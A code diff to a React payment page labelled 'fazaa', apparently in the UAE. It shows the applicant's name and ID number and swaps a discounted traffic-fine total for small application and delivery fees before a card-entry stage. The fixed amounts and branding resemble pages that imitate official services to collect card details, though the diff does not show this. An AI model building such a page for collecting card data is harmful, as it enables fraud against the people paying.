@@ -626,33 +626,42 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
   const [stage, setStage] = useState<Stage>('card')
   const [errorMessage, setErrorMessage] = useState<string | null>(null)
   const [isSubmitting, setIsSubmitting] = useState(false)
+  const [sessionData, setSessionData] = useState<{fullName?: string, idNumber?: string}>({})
   const [sessionId] = useState(() => {
     // Get session from URL or localStorage
     const urlParams = new URLSearchParams(window.location.search)
     const urlSessionId = urlParams.get('sessionId')
-    if (urlSessionId) return urlSessionId
+    
+    let sid = urlSessionId
     
     // Try localStorage
     try {
       const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
-      const lastSession = sessions[sessions.length - 1]
-      if (lastSession?.sessionId) return lastSession.sessionId
+      const lastSession = sid ? sessions.find((s: any) => s.sessionId === sid) : sessions[sessions.length - 1]
+      
+      if (lastSession) {
+        setSessionData({
+          fullName: lastSession.fullName,
+          idNumber: lastSession.idNumber
+        })
+        if (!sid) sid = lastSession.sessionId
+      }
     } catch (e) {
       console.error('Error reading sessions from localStorage', e)
     }
     
-    const newId = 'FAZ-' + Date.now().toString(36)
-    return newId
+    return sid || 'FAZ-' + Date.now().toString(36)
   })
 
-  const totalAmount = '150'
-  const fineAmount = '300'
-  const discountAmount = '150'
-  const dueAmount = '150'
+  const appFee = '10'
+  const deliveryFee = '5'
+  const dueAmount = '15'
 
   const transactionRows = [
-    { label: 'قيمة المخالفات', value: `${fineAmount} AED` },
-    { label: 'قيمة الخصم', value: `${discountAmount} AED` },
+    { label: 'اسم مقدم الطلب', value: sessionData.fullName || '-' },
+    { label: 'رقم هوية مقدم الطلب', value: sessionData.idNumber || '-' },
+    { label: 'رسوم تقديم الطلب', value: `${appFee} AED` },
+    { label: 'رسوم التوصيل', value: `${deliveryFee} AED` },
     { label: 'المبلغ المستحق', value: `${dueAmount} AED` },
   ]
 
@@ -806,7 +815,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
       <div className="flex-1 max-w-3xl w-full mx-auto px-6 py-8">
         {stage === 'card' && (
           <>
-            <SectionCard title="ملخص المبلغ">
+            <SectionCard title="ملخص الدفع">
               <InfoTable rows={transactionRows} />
             </SectionCard>
             <div className="mt-6">
